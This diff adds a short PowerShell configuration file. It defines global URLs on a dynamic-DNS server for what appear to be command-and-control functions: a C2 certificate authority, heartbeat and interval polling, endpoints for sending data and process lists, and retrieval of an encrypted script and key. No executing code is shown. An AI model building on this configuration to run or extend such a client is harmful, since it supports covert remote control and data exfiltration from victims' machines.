@@ -1,0 +1,16 @@
+# Base URLs
+$Global:ServerUrl = "https://rapid.tlnas.duckdns.org"
+$Global:base_url = "http://10.0.0.1:5000"
+
+$Global:c2_root_ca_url = "$ServerUrl/get_root_ca.php"
+$Global:c2_signing_url = "$ServerUrl/sign_csr.php"
+$Global:c2_verify_url = "$ServerUrl/verify_cert.php"
+$Global:key = "$ServerUrl/get_public_key.php"
+$Global:interval_base = "$ServerUrl/interval.php?"
+$Global:sending_base = "$ServerUrl/process.php"
+$Global:sending_list_base = "$ServerUrl/process_list.php"
+$Global:heartbeat = "$ServerUrl/ping.php?"
+$Global:processes_url = "$ServerUrl/processes.txt"
+$Global:fernet_key_endpoint = "$ServerUrl/get_encrypted_script.php"
+
+$Global:receive_script_and_key = "$base_url/receive_script_and_key"
